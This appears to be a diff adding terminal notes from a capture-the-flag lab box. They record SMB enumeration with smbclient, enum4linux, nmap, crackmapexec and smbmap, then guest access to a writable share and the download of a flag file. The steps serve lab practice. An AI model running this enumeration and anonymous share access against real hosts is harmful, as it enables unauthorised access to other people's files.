@@ -37,3 +37,265 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
+
+#enum for shared folder 
+
+smbclient -L 10.129.30.39                                                                                                                                                            INT ✘  09:52:01  
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\zerocool]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        WorkShares      Disk      
+SMB1 disabled -- no workgroup available
+
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec 17 09:54:54 2022
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.129.30.39
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.129.30.39 )============================
+
+Can't load /etc/samba/smb.conf - run testparm to debug it
+
+Can't exec "dig": Aucun fichier ou dossier de ce type at /usr/bin/enum4linux line 390.
+Use of uninitialized value $global_workgroup in pattern match (m//) at /usr/bin/enum4linux line 391.
+
+[E] Can't find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.129.30.39 )================================
+
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Looking up status of 10.129.30.39
+No reply from 10.129.30.39
+
+ ===================================( Session Check on 10.129.30.39 )===================================
+
+
+[+] Server 10.129.30.39 allows sessions using username '', password ''
+
+
+ ================================( Getting domain SID for 10.129.30.39 )================================
+
+Can't load /etc/samba/smb.conf - run testparm to debug it
+do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ===================================( OS information on 10.129.30.39 )===================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.129.30.39 from srvinfo: 
+Can't load /etc/samba/smb.conf - run testparm to debug it
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.129.30.39 )=======================================
+
+
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ =================================( Share Enumeration on 10.129.30.39 )=================================
+                                                                                                                                                                                                                     
+Can't load /etc/samba/smb.conf - run testparm to debug it                                                                                                                                                            
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.129.30.39                                                                                                                                                                         
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+ ============================( Password Policy Information for 10.129.30.39 )============================
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[E] Unexpected error from polenum:                                                                                                                                                                                   
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+
+[+] Attaching to 10.129.30.39 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:10.129.30.39)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+
+
+[E] Failed to get password policy with rpcclient                                                                                                                                                                     
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+
+ =======================================( Groups on 10.129.30.39 )=======================================
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[+] Getting builtin groups:                                                                                                                                                                                          
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[+]  Getting builtin group memberships:                                                                                                                                                                              
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[+]  Getting local groups:                                                                                                                                                                                           
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[+]  Getting local group memberships:                                                                                                                                                                                
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[+]  Getting domain groups:                                                                                                                                                                                          
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[+]  Getting domain group memberships:                                                                                                                                                                               
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+ ==================( Users on 10.129.30.39 via RID cycling (RIDS: 500-550,1000-1050) )==================
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                            
+                                                                                                                                                                                                                     
+                                                                                                                                                                                                                     
+ ===============================( Getting printer info for 10.129.30.39 )===============================
+                                                                                                                                                                                                                     
+Can't load /etc/samba/smb.conf - run testparm to debug it                                                                                                                                                            
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sat Dec 17 09:55:18 2022
+
+
+
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 10:02 CET
+Pre-scan script results:
+|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+Nmap scan report for 10.129.30.39
+Host is up (0.035s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+|_fcrdns: FAIL (No PTR record)
+| smb-protocols: 
+|   dialects: 
+|     202
+|     210
+|     300
+|     302
+|_    311
+| port-states: 
+|   tcp: 
+|_    open: 445
+| smb2-time: 
+|   date: 2022-12-17T13:03:08
+|_  start_date: N/A
+| unusual-port: 
+|_  WARNING: this script depends on Nmap's service/version detection (-sV)
+| smb-mbenum: 
+|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+| smb2-capabilities: 
+|   202: 
+|     Distributed File System
+|   210: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   300: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   302: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   311: 
+|     Distributed File System
+|     Leasing
+|_    Multi-credit operations
+| dns-blacklist: 
+|   SPAM
+|     list.quorum.to - FAIL
+|_    l2.apews.org - FAIL
+|_clock-skew: 4h00m02s
+
+Post-scan script results:
+| reverse-index: 
+|_  445/tcp: 10.129.30.39
+Nmap done: 1 IP address (1 host up) scanned in 77.23 seconds
+
+   /opt  crackmapexec smb 10.129.30.39 --users --groups --loggedon-users                                                                                                                       ✔  11:56:38  
+SMB         10.129.30.39    445    DANCING          [*] Windows 10.0 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:False) (SMBv1:False)
+SMB         10.129.30.39    445    DANCING          [-] Error enumerating logged on users: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+SMB         10.129.30.39    445    DANCING          [-] Error enumerating domain users using dc ip 10.129.30.39: socket connection error while opening: [Errno 111] Connection refused
+SMB         10.129.30.39    445    DANCING          [*] Trying with SAMRPC protocol
+SMB         10.129.30.39    445    DANCING          [-] Error enumerating domain group using dc ip 10.129.30.39: socket connection error while opening: [Errno 111] Connection refused
+
+    /opt  smbmap -H  10.129.30.39 -p 445                                                                                                                                                        ✔  12:05:18  
+[+] Guest session       IP: 10.129.30.39:445    Name: 10.129.30.39                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        WorkShares                                              READ, WRITE
+
+
+get the flag
+
+   ~/CTF/Boxes/Dancing-Box    main !2 ?1  smbclient //10.129.30.39/WorkShares                                                                                                    INT ✘  8s   12:16:28  
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\zerocool]:
+Try "help" to get a list of possible commands.
+smb: \> mask ""
+smb: \> prompt
+smb: \> recurse
+smb: \> ls
+  .                                   D        0  Sat Dec 17 17:14:58 2022
+  ..                                  D        0  Sat Dec 17 17:14:58 2022
+  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
+  James.P                             D        0  Thu Jun  3 10:38:03 2021
+
+\Amy.J
+  .                                   D        0  Mon Mar 29 11:08:24 2021
+  ..                                  D        0  Mon Mar 29 11:08:24 2021
+  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021
+
+\James.P
+  .                                   D        0  Thu Jun  3 10:38:03 2021
+  ..                                  D        0  Thu Jun  3 10:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 11:26:57 2021
+
+                5114111 blocks of size 4096. 1751927 blocks available
+smb: \> get James.P\flag.txt 
+getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
+smb: \> 
